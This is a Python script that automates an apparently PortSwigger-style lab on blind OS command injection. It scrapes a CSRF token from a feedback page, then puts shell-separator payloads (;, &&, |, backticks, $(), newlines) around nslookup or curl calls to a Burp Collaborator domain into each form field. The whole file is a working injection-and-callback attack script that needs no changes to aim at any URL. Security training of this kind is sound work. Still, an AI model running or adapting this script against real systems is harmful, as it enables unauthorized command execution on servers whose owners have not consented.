#!/usr/bin/env python3
import time
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

import argparse

# -----------------------------
# Config some params here
# -----------------------------
FEEDBACK_PATH = "/feedback"
SUBMIT_FEEDBACK_PATH = "/feedback/submit"

# Base form values
BASE_FORM_DATA = {
    "name": "test",
    "email": "test@example.com",
    "subject": "test subject",
    "message": "test message",
}

# Parameters we want to brute force (Sniper mode)
PARAMS_TO_TEST = ["name", "email", "subject", "message"]

# raw symbols without URL-encoding
payload_base_list = [
    ";<PAYLOAD>",
    "&<PAYLOAD>",
    "&&<PAYLOAD>",
    "|<PAYLOAD>",
    "||<PAYLOAD>",
    "\n<PAYLOAD>",  # URL-encoded version is "%0a<PAYLOAD>"
    "$(<PAYLOAD>",
    "`<PAYLOAD>",
    ";<PAYLOAD>;",
    "&<PAYLOAD>&",
    "&&<PAYLOAD>&&",
    "|<PAYLOAD>|",
    "||<PAYLOAD>||",
    "\n<PAYLOAD>\n",  # URL-encoded version is "%0a<PAYLOAD>%0a"
    "<PAYLOAD>",
    "$(<PAYLOAD>)"
]


def get_csrf_from_html(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on forgot-password page.")
    return token["value"]

def send_feedback(session: requests.Session, base_url: str, data: dict):
    """Send POST /feedback/submit."""
    submit_url = urljoin(base_url, SUBMIT_FEEDBACK_PATH)
    r = session.post(submit_url, data=data, timeout=20, verify=False)
    r.raise_for_status()

def build_oast_payload(mode: str, collaborator_domain: str) -> str:
    """
    Build the core OAST payload that will be wrapped by payload_base_list.
    We keep this NOT URL-encoded; requests will encode it properly.
    """
    if mode == "dns":
        # Simple interaction: nslookup COLLABORATOR_DOMAIN
        return f"nslookup <COUNTER>.{collaborator_domain}"
    elif mode == "http":
        # Simple HTTP interaction: curl http://COLLABORATOR_DOMAIN/
        return f"curl http://{collaborator_domain}/<COUNTER>"
    else:
        raise ValueError("OAST_MODE must be 'dns' or 'http'")


def sniper_attack(
    session: requests.Session,
    base_url: str,
    base_data: dict,
    params_to_test,
    payload: str,
    csrf_token: str,
    send_method
):
    """
    Intruder-like Sniper attack:
    - For each parameter in params_to_test:
      - For each wrapper in payload_base_list:
        - Insert payload only into that parameter
        - Send a request
    """

    print("[*] Starting Sniper attack...")
    counter = 1
    for param in params_to_test:
        for payload_base in payload_base_list:
            # Clone base data each time
            data = base_data.copy()
            data["csrf"] = csrf_token

            original_value = data.get(param, "")

            payload_with_number = payload.replace("<COUNTER>", str(counter))
            injected_value = original_value + payload_base.replace("<PAYLOAD>", payload_with_number)
            data[param] = injected_value

            print(f"[*] #{counter} Testing param '{param}' with payload:{injected_value}")
            counter += 1

            try:
                send_method(session, base_url, data)
            except Exception as e:
                print(f"[*] Exception: '{e}'")


def main():
    requests.packages.urllib3.disable_warnings()  # for lab self-signed certs
    parser = argparse.ArgumentParser(
        description="Lab: Blind OS command injection with out-of-band interaction"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    parser.add_argument("collaborator_domain", help="Burp Collaborator domain (no scheme).")
    parser.add_argument("oast_mode", help="Choose channel: 'dns' or 'http'.", default="dns")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    collaborator_domain = args.collaborator_domain
    oast_mode = args.oast_mode
    sess = requests.Session()

    print(f"[*] Base URL: {base_url}")
    print(f"[*] Collaborator domain: {collaborator_domain}")
    print(f"[*] OAST mode: {oast_mode}\n")

    # Step 1: Get CSRF token from /feedback page
    print("[*] Extracting CSRF token...\n")
    feedback_url = urljoin(base_url, FEEDBACK_PATH)
    r = sess.get(feedback_url, timeout=10, verify=False)
    r.raise_for_status()
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] CSRF token is {csrf_token}\n")

    # Step 2: Build core OAST payload (DNS or HTTP)
    oast_payload = build_oast_payload(oast_mode, collaborator_domain)
    print(f"[*] Core OAST payload: {oast_payload!r}\n")

    # Step 3: Perform parameter brute force (Intruder-like)
    print("[*] Performing parameter brute force...\n")
    sniper_attack(
        session=sess,
        base_url=base_url,
        base_data=BASE_FORM_DATA,
        params_to_test=PARAMS_TO_TEST,
        payload=oast_payload,
        csrf_token=csrf_token,
        send_method=send_feedback
    )

    print("\n[+] Brute force finished.")
    print("[+] Now check your listener:")
    print("    - Burp Collaborator (DNS/HTTP interactions).")


if __name__ == "__main__":
    main()
